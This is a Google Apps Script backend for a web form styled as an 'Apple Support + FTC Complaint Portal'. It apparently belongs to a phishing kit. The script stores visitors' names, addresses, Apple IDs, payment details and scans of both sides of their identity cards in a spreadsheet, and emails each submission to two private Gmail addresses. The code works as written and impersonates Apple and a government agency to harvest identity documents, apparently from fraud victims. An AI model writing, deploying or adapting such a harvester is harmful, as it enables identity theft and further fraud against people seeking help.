// Google Apps Script for Apple Support + FTC Complaint Portal
// Deploy as Web App → Execute as Me → Anyone can access

const SPREADSHEET_ID = '1nt9AMNvyH8iytT44IHClysQ5rR-m9IOzPaSBpiOQnyo';

const ADMIN_EMAIL  = 'janetgunnoe09@gmail.com';
const ADMIN_EMAIL2 = 'pw065508@gmail.com';

const COMPLAINTS_SHEET = 'Complaints';
const FTC_SHEET        = 'FTC_Reports';

// ── Initialize sheets ────────────────────────────────────────
function initializeSpreadsheet() {
  const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
  createSheetIfMissing(ss, COMPLAINTS_SHEET, getComplaintHeaders());
  createSheetIfMissing(ss, FTC_SHEET,        getFTCHeaders());
}

function createSheetIfMissing(ss, name, headers) {
  if (!ss.getSheetByName(name)) {
    const s = ss.insertSheet(name);
    s.getRange(1, 1, 1, headers.length).setValues([headers]).setFontWeight('bold');
    s.setFrozenRows(1);
  }
}

function getComplaintHeaders() {
  return [
    'Timestamp', 'Tracking Number', 'Full Name', 'Phone',
    'Email', 'Apple ID', 'Complaint Type', 'Description', 'Status'
  ];
}

function getFTCHeaders() {
  return [
    'Timestamp', 'Report Number', 'Category', 'Date Occurred',
    'Money Lost', 'Amount Lost ($)', 'Payment Method',
    'Scammer Name', 'Scammer Phone', 'Scammer Email', 'Scammer Website',
    'How Contacted', 'Impersonating',
    'First Name', 'Last Name', 'Email', 'Phone',
    'Address', 'City', 'State', 'ZIP',
    'ID Front', 'ID Back',
    'Story'
  ];
}

// ── Main POST handler ────────────────────────────────────────
function doPost(e) {
  try {
    const data = JSON.parse(e.postData.contents);
    const ss   = SpreadsheetApp.openById(SPREADSHEET_ID);
    initializeSpreadsheet();

    // FTC Report
    if (data.type === 'ftc_report') {
      const sheet = ss.getSheetByName(FTC_SHEET);
      sheet.appendRow([
        new Date().toISOString(),
        data.reportNumber,
        data.category,
        data.dateOccurred,
        data.moneyLost,
        data.amountLost,
        data.paymentMethod,
        data.scammerName,
        data.scammerPhone,
        data.scammerEmail,
        data.scammerWebsite,
        data.howContacted,
        data.scammerImpersonating,
        data.firstName,
        data.lastName,
        data.email,
        data.phone,
        data.address,
        data.city,
        data.state,
        data.zip,
        data.idFrontUploaded,
        data.idBackUploaded,
        data.story
      ]);

      const emailParts = buildFTCEmailParts(data);
      sendEmailBoth(
        '[FTC COMPLAINT PORTAL] New Report — ' + data.reportNumber + ' | ' + data.firstName + ' ' + data.lastName,
        emailParts.textBody,
        emailParts.htmlBody,
        emailParts.inlineImages
      );

    // Apple Complaint
    } else {
      const sheetName = data.sheet;
      const rowData   = data.data;
      const sheet     = ss.getSheetByName(sheetName);
      if (!sheet) throw new Error('Sheet not found: ' + sheetName);
      sheet.appendRow(rowData);
      sendEmailBoth(
        '[APPLE COMPLAINT PORTAL] New Complaint — Tracking: ' + rowData[1] + ' | ' + rowData[2],
        buildAppleEmailBody(rowData),
        null,
        null
      );
    }

    return ok('Data saved successfully');
  } catch (err) {
    Logger.log('doPost error: ' + err);
    return ok('Error: ' + err.toString());
  }
}

// ── Send to both admins ──────────────────────────────────────
function sendEmailBoth(subject, textBody, htmlBody, inlineImages) {
  const options = {};
  if (htmlBody) options.htmlBody = htmlBody;
  if (inlineImages) options.inlineImages = inlineImages;

  MailApp.sendEmail(ADMIN_EMAIL,  subject, textBody, options);
  MailApp.sendEmail(ADMIN_EMAIL2, subject, textBody, options);
}

// ── Convert base64 data URI to blob ──────────────────────────
function base64ToBlob(dataURI, filename) {
  if (!dataURI || dataURI.indexOf('base64') === -1) return null;
  const parts = dataURI.split(';base64,');
  const contentType = parts[0].split(':')[1] || 'image/jpeg';
  const raw = Utilities.base64Decode(parts[1]);
  return Utilities.newBlob(raw, contentType, filename);
}

// ── Build FTC email parts (text + HTML + inline images) ──────
function buildFTCEmailParts(d) {
  const textBody = [
    'NEW FTC COMPLAINT REPORT',
    '========================',
    '',
    'Report Number:  ' + d.reportNumber,
    'Submitted:      ' + new Date().toLocaleString(),
    '',
    '--- CLAIMANT ---',
    'Name:           ' + d.firstName + ' ' + d.lastName,
    'Email:          ' + d.email,
    'Phone:          ' + d.phone,
    'Address:        ' + [d.address, d.city, d.state, d.zip].filter(Boolean).join(', '),
    '',
    '--- FRAUD DETAILS ---',
    'Category:       ' + d.category,
    'Date Occurred:  ' + d.dateOccurred,
    'Money Lost:     ' + d.moneyLost + (d.amountLost ? ' ($' + d.amountLost + ')' : ''),
    'Payment Method: ' + d.paymentMethod,
    'How Contacted:  ' + d.howContacted,
    '',
    '--- SCAMMER ---',
    'Name:           ' + d.scammerName,
    'Phone:          ' + d.scammerPhone,
    'Email:          ' + d.scammerEmail,
    'Website:        ' + d.scammerWebsite,
    'Impersonating:  ' + d.scammerImpersonating,
    '',
    '--- ID UPLOAD ---',
    'ID Front:       ' + d.idFrontUploaded,
    'ID Back:        ' + d.idBackUploaded,
    '',
    '--- DESCRIPTION ---',
    d.story,
    '',
    'View Sheet: https://docs.google.com/spreadsheets/d/' + SPREADSHEET_ID
  ].join('\n');

  let htmlBody = '<h2 style="color:#1a3a6e;">NEW FTC COMPLAINT REPORT</h2>' +
    '<hr>' +
    '<p><strong>Report Number:</strong> ' + d.reportNumber + '</p>' +
    '<p><strong>Submitted:</strong> ' + new Date().toLocaleString() + '</p>' +
    '<h3 style="color:#1a3a6e;">Claimant</h3>' +
    '<p><strong>Name:</strong> ' + d.firstName + ' ' + d.lastName + '</p>' +
    '<p><strong>Email:</strong> ' + d.email + '</p>' +
    '<p><strong>Phone:</strong> ' + d.phone + '</p>' +
    '<p><strong>Address:</strong> ' + [d.address, d.city, d.state, d.zip].filter(Boolean).join(', ') + '</p>' +
    '<h3 style="color:#1a3a6e;">Fraud Details</h3>' +
    '<p><strong>Category:</strong> ' + d.category + '</p>' +
    '<p><strong>Date Occurred:</strong> ' + d.dateOccurred + '</p>' +
    '<p><strong>Money Lost:</strong> ' + d.moneyLost + (d.amountLost ? ' ($' + d.amountLost + ')' : '') + '</p>' +
    '<p><strong>Payment Method:</strong> ' + d.paymentMethod + '</p>' +
    '<p><strong>How Contacted:</strong> ' + d.howContacted + '</p>' +
    '<h3 style="color:#1a3a6e;">Scammer</h3>' +
    '<p><strong>Name:</strong> ' + d.scammerName + '</p>' +
    '<p><strong>Phone:</strong> ' + d.scammerPhone + '</p>' +
    '<p><strong>Email:</strong> ' + d.scammerEmail + '</p>' +
    '<p><strong>Website:</strong> ' + d.scammerWebsite + '</p>' +
    '<p><strong>Impersonating:</strong> ' + d.scammerImpersonating + '</p>';

  const inlineImages = {};

  if (d.idFrontBase64 && d.idFrontBase64.indexOf('base64') !== -1) {
    inlineImages.idFront = base64ToBlob(d.idFrontBase64, 'id-front.jpg');
    htmlBody += '<h3 style="color:#1a3a6e;">ID Front — ' + d.idFrontUploaded + '</h3>' +
                '<img src="cid:idFront" style="max-width:100%;border:1px solid #dce5ef;border-radius:6px;"><br>';
  }

  if (d.idBackBase64 && d.idBackBase64.indexOf('base64') !== -1) {
    inlineImages.idBack = base64ToBlob(d.idBackBase64, 'id-back.jpg');
    htmlBody += '<h3 style="color:#1a3a6e;">ID Back — ' + d.idBackUploaded + '</h3>' +
                '<img src="cid:idBack" style="max-width:100%;border:1px solid #dce5ef;border-radius:6px;"><br>';
  }

  htmlBody += '<h3 style="color:#1a3a6e;">Description</h3>' +
    '<p>' + (d.story || '').replace(/\n/g, '<br>') + '</p>' +
    '<hr>' +
    '<p><a href="https://docs.google.com/spreadsheets/d/' + SPREADSHEET_ID + '">View Google Sheet</a></p>';

  return {
    textBody: textBody,
    htmlBody: htmlBody,
    inlineImages: Object.keys(inlineImages).length ? inlineImages : null
  };
}

// ── Apple email body ─────────────────────────────────────────
function buildAppleEmailBody(r) {
  return [
    'NEW APPLE COMPLAINT SUBMISSION',
    '==============================',
    '',
    'Tracking Number: ' + r[1],
    'Name:            ' + r[2],
    'Phone:           ' + r[3],
    'Email:           ' + r[4],
    'Complaint Type:  ' + r[6],
    'Description:     ' + r[7],
    'Status:          ' + r[8],
    '',
    'View Sheet: https://docs.google.com/spreadsheets/d/' + SPREADSHEET_ID
  ].join('\n');
}

// ── Helpers ──────────────────────────────────────────────────
function ok(msg) {
  return ContentService.createTextOutput(JSON.stringify({ status: 'success', message: msg }))
    .setMimeType(ContentService.MimeType.JSON);
}

function doGet() {
  return ContentService.createTextOutput(JSON.stringify({
    status: 'running',
    sheet: 'https://docs.google.com/spreadsheets/d/' + SPREADSHEET_ID,
    timestamp: new Date().toISOString()
  })).setMimeType(ContentService.MimeType.JSON);
}

function setup() { initializeSpreadsheet(); }
